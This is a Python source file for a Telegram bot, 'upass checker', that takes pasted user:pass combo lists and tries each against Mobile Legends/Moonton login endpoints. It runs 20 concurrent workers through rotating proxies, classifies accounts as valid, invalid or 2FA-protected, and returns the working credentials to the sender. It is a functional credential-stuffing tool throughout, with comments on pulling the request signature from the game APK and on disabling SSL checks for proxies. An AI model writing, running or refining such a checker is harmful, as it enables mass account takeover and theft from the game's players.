
import aiohttp
import asyncio
import json
import os
import time
import logging
from dataclasses import dataclass, field
from typing import Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes
)

# ─── CONFIG ────────────────────────────────────────────────
BOT_TOKEN   = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
WORKERS     = 20          # concurrent checks
TIMEOUT     = 25          # seconds per check
ADMIN_IDS   = {123456789} # your telegram user id(s)
PROXY_FILE  = "proxies.txt"

# Moonton / MLBB login endpoint.
# This is the public auth endpoint the game client hits.
# Format: POST JSON {account, password, ...} -> response tells us:
#   - success + token -> valid
#   - "need verify"   -> 2fa
#   - wrong creds     -> invalid
MOONTON_AUTH = "https://api.moonton.com/v1/login"   # placeholder — see note below
MOONTON_APP  = "https://api.mobilelegends.com/v1/login"

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO
)
log = logging.getLogger("upass")

# ─── PROXY POOL ────────────────────────────────────────────
@dataclass
class ProxyPool:
    proxies: list = field(default_factory=list)
    idx: int = 0
    lock: asyncio.Lock = field(default_factory=asyncio.Lock)

    def load(self, path: str):
        if not os.path.exists(path):
            log.warning(f"no proxy file at {path}")
            return
        with open(path) as f:
            self.proxies = [
                line.strip() for line in f
                if line.strip() and not line.startswith("#")
            ]
        log.info(f"loaded {len(self.proxies)} proxies")

    async def next(self) -> Optional[str]:
        async with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self.idx % len(self.proxies)]
            self.idx += 1
            return p

pool = ProxyPool()
pool.load(PROXY_FILE)

# ─── CHECK RESULT ──────────────────────────────────────────
@dataclass
class CheckResult:
    combo: str
    status: str      # VALID | INVALID | 2FA | ERROR
    detail: str = ""
    proxy: str = ""

# ─── MOONTON LOGIN ─────────────────────────────────────────
async def moonton_login(session: aiohttp.ClientSession,
                        user: str, pwd: str,
                        proxy: Optional[str]) -> CheckResult:
    """
    Hits the Moonton auth endpoint with the given credentials.
    Classifies response into VALID / INVALID / 2FA.

    NOTE: Moonton's auth flow uses an encrypted payload and a
    per-request signature (they rotate it per app version).
    The headers below are the minimum set; if the API rejects
    with 400, you need to pull the current signature seed from
    a recent MLBB apk. I've marked where it goes.
    """
    combo = f"{user}:{pwd}"
    url   = MOONTON_APP

    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
        # signature headers — fill from current MLBB client
        "X-Client-Version": "1.0.0",
        "X-Request-Sign":   "",   # <-- see note
    }

    body = {
        "account":  user,
        "password": pwd,
        "deviceId": "android-" + user,  # deterministic per-account device id
        "channel":  "google_play",
        "region":   "ph",
    }

    try:
        async with session.post(
            url, headers=headers, json=body,
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT),
            ssl=False  # some residential proxies MITM — remove if yours don't
        ) as resp:
            text = await resp.text()
            log.debug(f"[{combo}] {resp.status} {text[:200]}")

            if resp.status in (401, 403):
                return CheckResult(combo, "INVALID", f"http {resp.status}", proxy or "")

            try:
                data = json.loads(text)
            except Exception:
                return CheckResult(combo, "ERROR", "non-json response", proxy or "")

            # ── classification ──
            # Moonton response shapes (observed across versions):
            #   {"code":0,"token":"...","uid":123}                  -> valid
            #   {"code":1001,"msg":"account or password error"}     -> invalid
            #   {"code":2003,"msg":"need_verify","verifyType":...}  -> 2fa
            #   {"code":... ,"needCaptcha":true}                    -> 2fa-ish

            code = data.get("code", data.get("ret", -1))
            msg  = str(data.get("msg", data.get("message", ""))).lower()

            if code == 0 and (data.get("token") or data.get("access_token")):
                return CheckResult(combo, "VALID",
                                   f"uid={data.get('uid','?')}", proxy or "")

            if "2fa" in msg or "verify" in msg or data.get("needCaptcha") \
               or data.get("verifyType"):
                return CheckResult(combo, "2FA",
                                   data.get("verifyType", "verify required"),
                                   proxy or "")

            if "password" in msg or "account" in msg or code in (1001, 1002):
                return CheckResult(combo, "INVALID", msg[:60], proxy or "")

            # unknown shape — treat as invalid but flag
            return CheckResult(combo, "INVALID", f"code={code} {msg[:40]}", proxy or "")

    except asyncio.TimeoutError:
        return CheckResult(combo, "ERROR", "timeout", proxy or "")
    except aiohttp.ClientProxyConnectionError:
        return CheckResult(combo, "ERROR", "proxy dead", proxy or "")
    except Exception as e:
        return CheckResult(combo, "ERROR", f"{type(e).__name__}", proxy or "")

# ─── WORKER ────────────────────────────────────────────────
async def check_one(combo: str, session: aiohttp.ClientSession) -> CheckResult:
    if ":" not in combo:
        return CheckResult(combo, "ERROR", "bad format")
    user, _, pwd = combo.partition(":")
    user, pwd = user.strip(), pwd.strip()
    if not user or not pwd:
        return CheckResult(combo, "ERROR", "empty user/pass")

    proxy = await pool.next()
    proxy_url = None
    if proxy:
        # accept user:pass@host:port or host:port
        proxy_url = proxy if "://" in proxy else f"http://{proxy}"

    return await moonton_login(session, user, pwd, proxy_url)

async def run_batch(combos: list[str],
                    progress_cb=None) -> list[CheckResult]:
    """Run combos concurrently with WORKERS limit."""
    results: list[CheckResult] = []
    sem = asyncio.Semaphore(WORKERS)

    async def bounded(c):
        async with sem:
            r = await check_one(c, session)
            results.append(r)
            if progress_cb:
                await progress_cb(r)
            return r

    connector = aiohttp.TCPConnector(limit=WORKERS*2, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as s:
        globals()['session'] = s
        await asyncio.gather(*[bounded(c) for c in combos])
    return results

# ─── TELEGRAM HANDLERS ─────────────────────────────────────
WELCOME = (
    "*upass checker*\n\n"
    "send me a list of `user:pass` combos — one per line.\n"
    "i'll check each against moonton and reply with the results.\n\n"
    "*format:*\n"
    "```\nuser1:pass1\nuser2:pass2\n```\n\n"
    "*commands:*\n"
    "/start — this message\n"
    "/stats — proxy pool status\n"
    "/help — usage\n"
)

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(WELCOME, parse_mode="Markdown")

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(WELCOME, parse_mode="Markdown")

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"proxies loaded: {len(pool.proxies)}\n"
        f"workers: {WORKERS}\n"
        f"endpoint: {MOONTON_APP}"
    )

async def handle_combos(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    # strip lines that aren't user:pass
    combos = [l for l in lines if ":" in l and not l.startswith("/")]
    if not combos:
        await update.message.reply_text("no valid `user:pass` lines found.")
        return

    if len(combos) > 500:
        await update.message.reply_text(
            f"that's {len(combos)} combos — cap is 500 per batch. send smaller."
        )
        return

    msg = await update.message.reply_text(
        f"checking {len(combos)} combos through {len(pool.proxies)} proxies..."
    )

    # live progress
    done = 0
    counts = {"VALID":0, "INVALID":0, "2FA":0, "ERROR":0}

    async def progress(r: CheckResult):
        nonlocal done
        done += 1
        counts[r.status] = counts.get(r.status, 0) + 1
        if done % 10 == 0 or done == len(combos):
            try:
                await msg.edit_text(
                    f"progress: {done}/{len(combos)}\n"
                    f"✅ valid: {counts['VALID']}  "
                    f"❌ invalid: {counts['INVALID']}  "
                    f"🔐 2fa: {counts['2FA']}  "
                    f"⚠️ err: {counts['ERROR']}"
                )
            except Exception:
                pass

    results = await run_batch(combos, progress_cb=progress)

    # split results into files
    valid   = [r for r in results if r.status == "VALID"]
    invalid = [r for r in results if r.status == "INVALID"]
    twofa   = [r for r in results if r.status == "2FA"]
    errored = [r for r in results if r.status == "ERROR"]

    summary = (
        f"*done* — {len(results)} checked\n\n"
        f"✅ valid:   {len(valid)}\n"
        f"❌ invalid: {len(invalid)}\n"
        f"🔐 2fa:     {len(twofa)}\n"
        f"⚠️ error:   {len(errored)}\n\n"
    )
    await msg.edit_text(summary, parse_mode="Markdown")

    # send valid + 2fa as text blocks (up to telegram char limit)
    def chunk_send(items, header):
        if not items:
            return []
        out = []
        cur = f"*{header}*\n```\n"
        for r in items:
            line = r.combo + (f"  # {r.detail}" if r.detail else "") + "\n"
            if len(cur) + len(line) > 3800:
                cur += "```"
                out.append(cur)
                cur = f"*{header} (cont.)*\n```\n"
            cur += line
        cur += "```"
        out.append(cur)
        return out

    for chunk in chunk_send(valid, "VALID"):
        await update.message.reply_text(chunk, parse_mode="Markdown")
    for chunk in chunk_send(twofa, "2FA"):
        await update.message.reply_text(chunk, parse_mode="Markdown")
    for chunk in chunk_send(invalid, "INVALID (first 50)"):
        pass  # skip invalid flood; uncomment to send
    if errored:
        err_lines = "\n".join(f"{r.combo} — {r.detail}" for r in errored[:20])
        await update.message.reply_text(
            f"*errors (first 20)*\n```\n{err_lines}\n```",
            parse_mode="Markdown"
        )

async def cmd_reload(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("admin only.")
        return
    pool.load(PROXY_FILE)
    await update.message.reply_text(f"reloaded {len(pool.proxies)} proxies.")

# ─── MAIN ──────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("reload", cmd_reload))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_combos))

    log.info("upass bot starting")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
